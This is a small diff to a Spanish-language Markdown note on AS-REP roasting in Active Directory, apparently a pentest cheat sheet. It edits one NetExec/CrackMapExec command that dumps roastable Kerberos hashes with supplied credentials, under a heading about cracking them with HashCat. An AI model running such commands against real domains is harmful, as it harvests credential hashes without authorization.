@@ -5,7 +5,7 @@ Tags: #AD #ASREProstable  #Crackmapexec #HashCat #Kali #Parrot
 ## Explotar con CrackMapExec
 
 ```bash 
-❯ nxc ldap IP -u 'clearpass.user' -p 'Password@1' --asreproast output.txt
+❯ nxc ldap <IP> -u 'clearpass.user' -p 'Password@1' --asreproast output.txt
 ```
 
 ## Crackear el Hash obtenido 
